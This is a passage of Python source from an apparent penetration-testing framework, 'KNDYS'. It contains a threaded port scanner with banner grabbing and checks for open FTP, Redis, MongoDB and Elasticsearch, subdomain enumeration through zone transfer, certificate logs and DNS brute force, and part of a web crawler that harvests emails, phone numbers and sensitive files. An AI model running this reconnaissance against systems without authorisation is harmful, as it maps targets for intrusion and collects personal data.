        def grab_banner_advanced(sock, port):
            """Advanced banner grabbing with protocol-specific probes"""
            banner_info = {'raw': '', 'service': '', 'version': '', 'info': ''}
            
            try:
                if port in [80, 8080, 8000, 8888]:
                    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                    response = sock.recv(2048).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if 'Server:' in response:
                        server_line = [line for line in response.split('\n') if line.startswith('Server:')]
                        if server_line:
                            banner_info['service'] = server_line[0].replace('Server:', '').strip()
                elif port == 443:
                    banner_info['service'] = 'HTTPS'
                elif port == 22:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if 'SSH' in response:
                        banner_info['service'] = 'SSH'
                        banner_info['version'] = response.strip()
                elif port == 21:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if '220' in response:
                        banner_info['service'] = 'FTP'
                        banner_info['version'] = response.strip()
                elif port == 25:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if '220' in response:
                        banner_info['service'] = 'SMTP'
                elif port == 3306:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    if 'mysql' in response.lower():
                        banner_info['service'] = 'MySQL'
                elif port == 6379:
                    sock.send(b'PING\r\n')
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    if 'PONG' in response:
                        banner_info['service'] = 'Redis'
                else:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response[:200]
            except:
                pass
            
            return banner_info
        
        def check_vulnerabilities(port, banner_info):
            """Check for common vulnerabilities"""
            vulns = []
            
            if aggressive:
                try:
                    if port == 21: # FTP Anonymous
                        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        test_sock.settimeout(timeout)
                        test_sock.connect((target, port))
                        test_sock.recv(1024)
                        test_sock.send(b'USER anonymous\r\n')
                        response = test_sock.recv(1024).decode('utf-8', errors='ignore')
                        if '230' in response or '331' in response:
                            vulns.append({'type': 'FTP Anonymous', 'severity': 'HIGH', 'description': 'FTP allows anonymous login'})
                        test_sock.close()
                    elif port == 6379: # Redis no auth
                        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        test_sock.settimeout(timeout)
                        test_sock.connect((target, port))
                        test_sock.send(b'INFO\r\n')
                        response = test_sock.recv(4096).decode('utf-8', errors='ignore')
                        if 'redis_version' in response:
                            vulns.append({'type': 'Redis Unprotected', 'severity': 'CRITICAL', 'description': 'Redis without authentication'})
                        test_sock.close()
                    elif port == 27017: # MongoDB
                        vulns.append({'type': 'MongoDB Exposed', 'severity': 'HIGH', 'description': 'MongoDB port publicly accessible'})
                    elif port == 9200: # Elasticsearch
                        vulns.append({'type': 'Elasticsearch Open', 'severity': 'HIGH', 'description': 'Elasticsearch without authentication'})
                except:
                    pass
            
            return vulns
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    banner_info = grab_banner_advanced(sock, port)
                    service_name = self.get_service_name_extended(port)
                    vulns = check_vulnerabilities(port, banner_info)
                    
                    sock.close()
                    return port, True, banner_info, service_name, vulns
                sock.close()
            except Exception as e:
                pass
            return port, False, {}, '', []
        
        # Execute scan
        print(f"{Fore.BLUE} Starting advanced port scan...{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            
            for future in concurrent.futures.as_completed(futures):
                port, is_open, banner_info, service_name, vulns = future.result()
                if is_open:
                    open_ports.append(port)
                    scan_results[port] = {
                        'service': service_name,
                        'banner': banner_info,
                        'vulnerabilities': vulns
                    }
                    
                    print(f"{Fore.GREEN} {port:>5}/TCP {Fore.CYAN}OPEN {Fore.WHITE}→ {service_name}{Style.RESET_ALL}")
                    
                    if banner_info.get('version'):
                        print(f"{Fore.BLUE} └─ Version: {banner_info['version'][:60]}{Style.RESET_ALL}")
                    elif banner_info.get('service'):
                        print(f"{Fore.BLUE} └─ Service: {banner_info['service'][:60]}{Style.RESET_ALL}")
                    
                    if vulns:
                        vulnerabilities.extend(vulns)
                        for vuln in vulns:
                            severity_color = Fore.MAGENTA if vuln['severity'] == 'CRITICAL' else Fore.RED
                            print(f"{severity_color} {vuln['type']}: {vuln['description']}{Style.RESET_ALL}")
        
        elapsed_time = time.time() - start_time
        
        # Summary
        print(f"\n{Fore.WHITE}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan completed in {elapsed_time:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total ports scanned: {len(ports)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Open ports found: {len(open_ports)}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Vulnerabilities detected: {len(vulnerabilities)}{Style.RESET_ALL}")
        
        # Detailed summary
        if open_ports:
            print(f"\n{Fore.YELLOW}[*] Service Summary:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
            
            # Group by service
            services_grouped = {}
            for port in sorted(open_ports):
                service = scan_results[port]['service']
                if service not in services_grouped:
                    services_grouped[service] = []
                services_grouped[service].append(port)
            
            for service, ports_list in sorted(services_grouped.items()):
                ports_str = ', '.join(map(str, ports_list))
                print(f"{Fore.CYAN} {service:20s} {Fore.WHITE}→ Ports: {ports_str}{Style.RESET_ALL}")
            
            # Export results
            self._export_port_scan_results(target, scan_results, elapsed_time)
        else:
            print(f"{Fore.YELLOW}[*] No open ports found{Style.RESET_ALL}")
    
    def get_service_name(self, port):
        """Get service name for common ports"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB',
            11211: 'Memcached'
        }
        return services.get(port, 'Unknown')
    
    def get_service_name_extended(self, port):
        """Extended service database with 90+ services"""
        services = {
            # File Transfer
            20: 'FTP-DATA', 21: 'FTP', 22: 'SSH/SFTP', 69: 'TFTP', 989: 'FTPS-DATA', 990: 'FTPS',
            # Email
            25: 'SMTP', 110: 'POP3', 143: 'IMAP', 465: 'SMTPS', 587: 'SMTP-Submission',
            993: 'IMAPS', 995: 'POP3S',
            # Web
            80: 'HTTP', 443: 'HTTPS', 8000: 'HTTP-Alt', 8008: 'HTTP-Alt', 8080: 'HTTP-Proxy',
            8081: 'HTTP-Alt', 8088: 'HTTP-Alt', 8443: 'HTTPS-Alt', 8888: 'HTTP-Alt',
            # Databases
            1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 5432: 'PostgreSQL', 5984: 'CouchDB',
            6379: 'Redis', 7000: 'Cassandra', 7001: 'Cassandra-JMX', 8529: 'ArangoDB',
            9042: 'Cassandra-CQL', 9200: 'Elasticsearch', 9300: 'Elasticsearch-Transport',
            27017: 'MongoDB', 27018: 'MongoDB-Shard', 28017: 'MongoDB-Web',
            # Remote Access
            23: 'Telnet', 3389: 'RDP', 5900: 'VNC', 5901: 'VNC-1', 5902: 'VNC-2',
            # Directory Services
            88: 'Kerberos', 389: 'LDAP', 636: 'LDAPS', 3268: 'Global-Catalog', 3269: 'Global-Catalog-SSL',
            # File Sharing
            137: 'NetBIOS-NS', 138: 'NetBIOS-DGM', 139: 'NetBIOS-SSN', 445: 'SMB/CIFS',
            2049: 'NFS', 2121: 'FTP-Proxy',
            # DNS
            53: 'DNS', 5353: 'mDNS',
            # Monitoring
            161: 'SNMP', 162: 'SNMP-Trap', 514: 'Syslog', 10000: 'Webmin', 19999: 'Netdata',
            # Proxy & Cache
            3128: 'Squid-Proxy', 8118: 'Privoxy', 11211: 'Memcached',
            # Containers & Orchestration
            2375: 'Docker', 2376: 'Docker-SSL', 2377: 'Docker-Swarm',
            6443: 'Kubernetes-API', 10250: 'Kubelet', 10251: 'Kube-Scheduler', 10252: 'Kube-Controller',
            # Message Queues
            4369: 'Erlang-Port-Mapper', 5672: 'AMQP', 15672: 'RabbitMQ-Management',
            # Version Control
            3000: 'Grafana/Gitea', 9000: 'SonarQube',
            # Game Servers
            25565: 'Minecraft', 27015: 'Source-Engine', 7777: 'Terraria',
            # Other
            111: 'RPCBind', 135: 'MS-RPC', 1723: 'PPTP', 5060: 'SIP', 5061: 'SIP-TLS',
        }
        return services.get(port, f'Unknown({port})')
    
    def _export_port_scan_results(self, target, results, elapsed_time):
        """Export scan results to JSON and TXT"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'target': target,
            'timestamp': timestamp,
            'scan_time': f'{elapsed_time:.2f}s',
            'open_ports': len(results),
            'results': {}
        }
        
        for port, data in results.items():
            json_data['results'][str(port)] = {
                'service': data['service'],
                'banner': data['banner'].get('version', '') or data['banner'].get('service', ''),
                'vulnerabilities': data['vulnerabilities']
            }
        
        json_file = f'portscan_{target}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'portscan_{target}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("PORT SCAN REPORT - KNDYS FRAMEWORK\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed_time:.2f} seconds\n")
            f.write(f"Open Ports: {len(results)}\n\n")
            f.write("=" * 70 + "\n")
            f.write("OPEN PORTS DETAILS\n")
            f.write("=" * 70 + "\n\n")
            
            for port in sorted(results.keys()):
                data = results[port]
                f.write(f"Port: {port}/TCP\n")
                f.write(f"Service: {data['service']}\n")
                if data['banner'].get('version'):
                    f.write(f"Version: {data['banner']['version']}\n")
                if data['vulnerabilities']:
                    f.write("Vulnerabilities:\n")
                    for vuln in data['vulnerabilities']:
                        f.write(f" - [{vuln['severity']}] {vuln['type']}: {vuln['description']}\n")
                f.write("\n" + "-" * 70 + "\n\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    def run_subdomain_scanner(self):
        """Professional subdomain enumeration with multiple techniques"""
        domain = self.module_options['domain']
        wordlist_file = self.module_options.get('wordlist', '')
        threads = int(self.module_options.get('threads', 20))
        techniques = self.module_options.get('techniques', 'all')
        verify_http = self.module_options.get('verify_http', 'true').lower() == 'true'
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ PROFESSIONAL SUBDOMAIN SCANNER - KNDYS ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Domain:{Style.RESET_ALL} {Fore.CYAN}{domain}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Techniques:{Style.RESET_ALL} {Fore.CYAN}{techniques}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL} {Fore.CYAN}{threads}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}HTTP Check:{Style.RESET_ALL} {Fore.CYAN}{verify_http}{Style.RESET_ALL}\n")
        
        start_time = time.time()
        found_subdomains = {}
        wildcard_ip = self._detect_wildcard_dns(domain)
        
        if wildcard_ip:
            print(f"{Fore.YELLOW}[!] Wildcard DNS detected: *.{domain} -> {wildcard_ip}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Results will be filtered to remove false positives{Style.RESET_ALL}\n")
        
        # Technique 1: DNS Zone Transfer
        if techniques == 'all' or 'axfr' in techniques:
            print(f"{Fore.BLUE}[1/5] Attempting DNS Zone Transfer (AXFR)...{Style.RESET_ALL}")
            axfr_results = self._try_zone_transfer(domain)
            if axfr_results:
                print(f"{Fore.GREEN} [+] Zone transfer successful! Found {len(axfr_results)} records{Style.RESET_ALL}")
                for sub, ip in axfr_results.items():
                    if ip != wildcard_ip:
                        found_subdomains[sub] = {'ip': ip, 'source': 'AXFR'}
            else:
                print(f"{Fore.YELLOW} [-] Zone transfer not allowed{Style.RESET_ALL}")
        
        # Technique 2: Certificate Transparency
        if techniques == 'all' or 'crt' in techniques:
            print(f"\n{Fore.BLUE}[2/5] Searching Certificate Transparency logs...{Style.RESET_ALL}")
            crt_results = self._search_crt_sh(domain)
            if crt_results:
                print(f"{Fore.GREEN} [+] Found {len(crt_results)} subdomains from certificates{Style.RESET_ALL}")
                for sub in crt_results:
                    if sub not in found_subdomains:
                        try:
                            ip = socket.gethostbyname(sub)
                            if ip != wildcard_ip:
                                found_subdomains[sub] = {'ip': ip, 'source': 'CRT'}
                                print(f"{Fore.GREEN} → {sub} [{ip}]{Style.RESET_ALL}")
                        except:
                            pass
        
        # Technique 3: DNS Brute Force
        if techniques == 'all' or 'brute' in techniques:
            print(f"\n{Fore.BLUE}[3/5] DNS Brute Force enumeration...{Style.RESET_ALL}")
            
            # Load wordlist
            wordlist = self._get_subdomain_wordlist(wordlist_file)
            print(f"{Fore.WHITE} Wordlist size: {len(wordlist)} terms{Style.RESET_ALL}")
            
            brute_results = self._dns_brute_force(domain, wordlist, threads, wildcard_ip)
            if brute_results:
                print(f"{Fore.GREEN} [+] Brute force found {len(brute_results)} subdomains{Style.RESET_ALL}")
                for sub, ip in brute_results.items():
                    if sub not in found_subdomains:
                        found_subdomains[sub] = {'ip': ip, 'source': 'BRUTE'}
        
        # Technique 4: Common Patterns
        if techniques == 'all' or 'patterns' in techniques:
            print(f"\n{Fore.BLUE}[4/5] Testing common patterns...{Style.RESET_ALL}")
            pattern_results = self._test_common_patterns(domain, wildcard_ip)
            if pattern_results:
                print(f"{Fore.GREEN} [+] Found {len(pattern_results)} from patterns{Style.RESET_ALL}")
                for sub, ip in pattern_results.items():
                    if sub not in found_subdomains:
                        found_subdomains[sub] = {'ip': ip, 'source': 'PATTERN'}
        
        # Technique 5: HTTP/HTTPS Verification
        if verify_http and found_subdomains:
            print(f"\n{Fore.BLUE}[5/5] Verifying HTTP/HTTPS accessibility...{Style.RESET_ALL}")
            self._verify_http_access(found_subdomains, threads)
        
        elapsed_time = time.time() - start_time
        
        # Summary
        print(f"\n{Fore.WHITE}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan completed in {elapsed_time:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Total subdomains found: {len(found_subdomains)}{Style.RESET_ALL}")
        
        if found_subdomains:
            # Group by source
            sources = {}
            for sub, data in found_subdomains.items():
                source = data['source']
                sources[source] = sources.get(source, 0) + 1
            
            print(f"\n{Fore.YELLOW}[*] Results by technique:{Style.RESET_ALL}")
            for source, count in sorted(sources.items()):
                print(f"{Fore.WHITE} {source:10s}: {count} subdomains{Style.RESET_ALL}")
            
            # Display results
            print(f"\n{Fore.YELLOW}[*] Discovered subdomains:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
            for sub in sorted(found_subdomains.keys()):
                data = found_subdomains[sub]
                http_status = data.get('http_status', '')
                status_str = f" [{http_status}]" if http_status else ""
                print(f"{Fore.GREEN} {sub:40s} {Fore.CYAN}{data['ip']:15s} {Fore.YELLOW}{status_str}{Style.RESET_ALL}")
            
            # Export results
            self._export_subdomain_results(domain, found_subdomains, elapsed_time)
        else:
            print(f"{Fore.YELLOW}[*] No subdomains found{Style.RESET_ALL}")
    
    def _detect_wildcard_dns(self, domain):
        """Detect wildcard DNS configuration"""
        random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20))
        try:
            ip = socket.gethostbyname(f"{random_sub}.{domain}")
            return ip
        except:
            return None
    
    def _try_zone_transfer(self, domain):
        """Attempt DNS zone transfer"""
        results = {}
        if not DNS_AVAILABLE or dns is None:
            return results
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                ns_server = str(ns)
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_server, domain))
                    for name, node in zone.nodes.items():
                        subdomain = str(name) + '.' + domain if str(name) != '@' else domain
                        for rdataset in node.rdatasets:
                            if rdataset.rdtype == dns.rdatatype.A:
                                for rdata in rdataset:
                                    results[subdomain] = str(rdata)
                except:
                    pass
        except:
            pass
        return results
    
    def _search_crt_sh(self, domain):
        """Search Certificate Transparency logs via crt.sh"""
        subdomains = set()
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    for sub in name_value.split('\n'):
                        sub = sub.strip()
                        if '*' not in sub and sub.endswith(domain):
                            subdomains.add(sub)
        except:
            pass
        return list(subdomains)
    
    def _get_subdomain_wordlist(self, wordlist_file):
        """Load or generate subdomain wordlist"""
        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            except:
                pass
        
        # Enhanced built-in wordlist (246 terms)
        return [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2',
            'cpanel', 'whm', 'autodiscover', 'autoconfig', 'test', 'dev', 'staging', 'prod', 'production',
            'api', 'admin', 'portal', 'remote', 'beta', 'mx', 'mx1', 'mx2', 'shop', 'blog', 'news',
            'www2', 'm', 'mobile', 'vpn', 'secure', 'support', 'cdn', 'static', 'images', 'img',
            'forum', 'forums', 'chat', 'wiki', 'help', 'status', 'monitoring', 'git', 'svn', 'backup',
            'old', 'new', 'demo', 'app', 'apps', 'store', 'download', 'downloads', 'web', 'server',
            'cloud', 'dashboard', 'console', 'panel', 'control', 'login', 'signin', 'register', 'signup',
            'sso', 'auth', 'account', 'accounts', 'profile', 'user', 'users', 'members', 'member',
            'client', 'clients', 'partner', 'partners', 'reseller', 'resellers', 'affiliate', 'affiliates',
            'corporate', 'corp', 'enterprise', 'ent', 'business', 'b2b', 'b2c', 'internal', 'intranet',
            'extranet', 'external', 'private', 'public', 'customer', 'customers', 'vendor', 'vendors',
            'payment', 'payments', 'billing', 'invoice', 'invoices', 'order', 'orders', 'cart', 'checkout',
            'cms', 'crm', 'erp', 'hr', 'finance', 'sales', 'marketing', 'analytics', 'stats', 'statistics',
            'reports', 'report', 'data', 'database', 'db', 'sql', 'mysql', 'postgres', 'mongo', 'redis',
            'cache', 'queue', 'mq', 'rabbitmq', 'kafka', 'elastic', 'elasticsearch', 'kibana', 'grafana',
            'prometheus', 'jenkins', 'gitlab', 'github', 'bitbucket', 'docker', 'kubernetes', 'k8s',
            'cluster', 'node', 'node1', 'node2', 'master', 'slave', 'primary', 'secondary', 'replica',
            'db1', 'db2', 'web1', 'web2', 'app1', 'app2', 'api1', 'api2', 'load-balancer', 'lb',
            'proxy', 'gateway', 'edge', 'cdn1', 'cdn2', 'media', 'video', 'streaming', 'live',
            'office', 'mail2', 'smtp2', 'pop3', 'imap', 'exchange', 'owa', 'outlook', 'webmail2',
            'calendar', 'contacts', 'docs', 'documents', 'files', 'share', 'sharing', 'drive',
            'vpn1', 'vpn2', 'tunnel', 'proxy1', 'proxy2', 'socks', 'tor', 'onion', 'i2p',
            'test1', 'test2', 'dev1', 'dev2', 'stage', 'stage1', 'stage2', 'uat', 'qa', 'preprod',
            'v1', 'v2', 'v3', 'version1', 'version2', 'release', 'latest', 'stable', 'alpha', 'gamma',
            'delta', 'next', 'future', 'preview', 'sandbox', 'lab', 'experiment', 'research'
        ]
    
    def _dns_brute_force(self, domain, wordlist, threads, wildcard_ip):
        """Perform DNS brute force with rate limiting"""
        results = {}
        
        def check_subdomain(sub):
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                if ip != wildcard_ip:
                    return full_domain, ip
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    subdomain, ip = result
                    results[subdomain] = ip
                    print(f"{Fore.GREEN} → {subdomain} [{ip}]{Style.RESET_ALL}")
        
        return results
    
    def _test_common_patterns(self, domain, wildcard_ip):
        """Test common subdomain patterns"""
        results = {}
        patterns = [
            # VPN
            'vpn', 'vpn1', 'vpn2', 'ssl-vpn', 'remote',
            # Mail
            'mail', 'mail2', 'smtp', 'pop', 'imap', 'mx', 'mx1', 'mx2', 'webmail',
            # Remote Access
            'citrix', 'rdp', 'desktop', 'terminal', 'ts',
            # Corporate
            'intranet', 'extranet', 'internal', 'corp', 'corporate',
            # Common
            'www', 'ftp', 'api', 'dev', 'test', 'staging'
        ]
        
        for pattern in patterns:
            full_domain = f"{pattern}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                if ip != wildcard_ip:
                    results[full_domain] = ip
            except:
                pass
        
        return results
    
    def _verify_http_access(self, subdomains, threads):
        """Verify HTTP/HTTPS accessibility"""
        def check_http(subdomain, data):
            for protocol in ['https', 'http']:
                try:
                    url = f"{protocol}://{subdomain}"
                    response = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                    data['http_status'] = f"{protocol.upper()} {response.status_code}"
                    if 'Server' in response.headers:
                        data['server'] = response.headers['Server']
                    return
                except:
                    pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_http, sub, data) for sub, data in subdomains.items()]
            concurrent.futures.wait(futures)
    
    def _export_subdomain_results(self, domain, results, elapsed_time):
        """Export subdomain scan results"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'domain': domain,
            'timestamp': timestamp,
            'scan_time': f'{elapsed_time:.2f}s',
            'total_subdomains': len(results),
            'subdomains': {}
        }
        
        for sub, data in results.items():
            json_data['subdomains'][sub] = {
                'ip': data['ip'],
                'source': data['source'],
                'http_status': data.get('http_status', ''),
                'server': data.get('server', '')
            }
        
        json_file = f'subdomains_{domain}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'subdomains_{domain}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("SUBDOMAIN ENUMERATION REPORT - KNDYS FRAMEWORK\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Domain: {domain}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed_time:.2f} seconds\n")
            f.write(f"Subdomains Found: {len(results)}\n\n")
            f.write("=" * 70 + "\n")
            f.write("DISCOVERED SUBDOMAINS\n")
            f.write("=" * 70 + "\n\n")
            
            for sub in sorted(results.keys()):
                data = results[sub]
                f.write(f"Subdomain: {sub}\n")
                f.write(f"IP: {data['ip']}\n")
                f.write(f"Source: {data['source']}\n")
                if data.get('http_status'):
                    f.write(f"HTTP: {data['http_status']}\n")
                if data.get('server'):
                    f.write(f"Server: {data['server']}\n")
                f.write("\n" + "-" * 70 + "\n\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    def run_web_crawler(self):
        """Advanced web crawler with tech detection and vulnerability analytics"""
        url = self.module_options['url']
        depth = int(self.module_options.get('depth', 3))
        threads = int(self.module_options.get('threads', 10))
        max_pages = int(self.module_options.get('max_pages', 100))
        respect_robots = self.module_options.get('respect_robots', 'true').lower() == 'true'
        scan_vulns = self.module_options.get('scan_vulns', 'false').lower() == 'true'
        extract_js = self.module_options.get('extract_js', 'true').lower() == 'true'
        sensitive_scan = self.module_options.get('sensitive_scan', 'true').lower() == 'true'
        sensitive_timeout = float(self.module_options.get('sensitive_timeout', '3'))
        sensitive_workers = int(self.module_options.get('sensitive_workers', '5'))
        
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*20}WEB CRAWLER - KNDYS v3.0{' '*27}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Depth: {depth} | Max Pages: {max_pages} | Threads: {threads}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Respect robots.txt: {respect_robots} | Vuln Scan: {scan_vulns} | JS Analysis: {extract_js}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Sensitive Scan: {sensitive_scan} | Timeout: {sensitive_timeout:.1f}s | Workers: {sensitive_workers}{Style.RESET_ALL}\n")
        
        base_domain = urlparse(url).netloc
        start_time = time.time()
        session = requests.Session()
        session.headers.update({'User-Agent': self.config['user_agent']})
        
        disallowed_paths = []
        if respect_robots:
            disallowed_paths = self._check_robots_txt(url)
            if disallowed_paths:
                print(f"{Fore.YELLOW}[!] robots.txt contains {len(disallowed_paths)} disallowed entries{Style.RESET_ALL}")
        
        visited = set()
        to_visit = [(url, 0)]
        results = {
            'pages': {},
            'links': [],
            'forms': [],
            'files': {
                'documents': [],
                'images': [],
                'scripts': [],
                'stylesheets': [],
                'media': []
            },
            'emails': [],
            'phone_numbers': [],
            'js_endpoints': [],
            'api_endpoints': [],
            'parameters': set(),
            'sensitive_files': [],
            'technologies': [],
            'security_headers': {},
            'cookies': [],
            'vulnerabilities': [],
            'comments': []
        }
        
        crawl_count = 0
        while to_visit and len(visited) < max_pages:
            current_url, current_depth = to_visit.pop(0)
            if current_url in visited or current_depth > depth:
                continue
            if urlparse(current_url).netloc != base_domain:
                continue
            if respect_robots and any(current_url.startswith(urljoin(url, path)) for path in disallowed_paths):
                continue
            
            visited.add(current_url)
            crawl_count += 1
            print(f"{Fore.BLUE}[{crawl_count}/{max_pages}] Crawling: {current_url[:80]}{Style.RESET_ALL}", end='\r')
            
            try:
                response = session.get(current_url, timeout=15, verify=False, allow_redirects=True)
                soup = BeautifulSoup(response.text, 'html.parser')
                results['pages'][current_url] = {
                    'status_code': response.status_code,
                    'title': (soup.title.string.strip() if soup.title and soup.title.string else 'No title')[:120],
                    'depth': current_depth,
                    'content_length': len(response.text)
                }
                
                if current_url == url:
                    results['technologies'] = self._detect_technologies(response, soup)
                    results['security_headers'] = self._analyze_security_headers(response.headers)
                    results['cookies'] = self._analyze_cookies(response.cookies)
                
                for link in soup.find_all('a', href=True):
                    href = link['href'].strip()
                    full_url = urljoin(current_url, href).split('#')[0]
                    if full_url not in visited and urlparse(full_url).netloc == base_domain:
                        to_visit.append((full_url, current_depth + 1))
                        if full_url not in results['links']:
                            results['links'].append(full_url)
                
                forms, form_vulns = self._extract_forms(soup, current_url, scan_vulns)
                results['forms'].extend(forms)
                results['vulnerabilities'].extend(form_vulns)
                
                self._extract_files(soup, current_url, results['files'])
                results['emails'].extend(self._extract_emails(response.text))
                results['phone_numbers'].extend(self._extract_phones(response.text))
                results['parameters'].update(self._extract_parameters(current_url))
                results['comments'].extend(self._extract_comments(soup, current_url))
                
                if extract_js:
                    js_hits = self._extract_js_endpoints(response.text)
                    results['js_endpoints'].extend(js_hits)
                    results['api_endpoints'].extend([hit for hit in js_hits if any(token in hit for token in ['/api/', '/v1/', '/v2/'])])
                
                time.sleep(0.1)
            except Exception as exc:
                print(f"{Fore.RED}\n[-] Error crawling {current_url[:80]}: {exc}{Style.RESET_ALL}")
        
        if sensitive_scan:
            print(f"\n\n{Fore.CYAN}[*] Checking sensitive files...{Style.RESET_ALL}")
            results['sensitive_files'] = self._probe_sensitive_files(
                url,
                session=session,
                timeout=sensitive_timeout,
                max_workers=sensitive_workers
            )
        else:
            print(f"\n\n{Fore.YELLOW}[!] Sensitive file probing disabled{Style.RESET_ALL}")
            results['sensitive_files'] = []
        
        elapsed = time.time() - start_time
        results['emails'] = sorted(set(results['emails']))
        results['phone_numbers'] = sorted(set(results['phone_numbers']))
        results['js_endpoints'] = sorted(set(results['js_endpoints']))
        results['api_endpoints'] = sorted(set(results['api_endpoints']))
        results['parameters'] = sorted(results['parameters'])
        
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}CRAWL SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Pages Crawled: {len(results['pages'])}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Links Found: {len(results['links'])}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Forms Found: {len(results['forms'])}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Emails: {len(results['emails'])}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Phone Numbers: {len(results['phone_numbers'])}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] JS Endpoints: {len(results['js_endpoints'])}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Sensitive Files: {len(results['sensitive_files'])}{Style.RESET_ALL}")
        if results['vulnerabilities']:
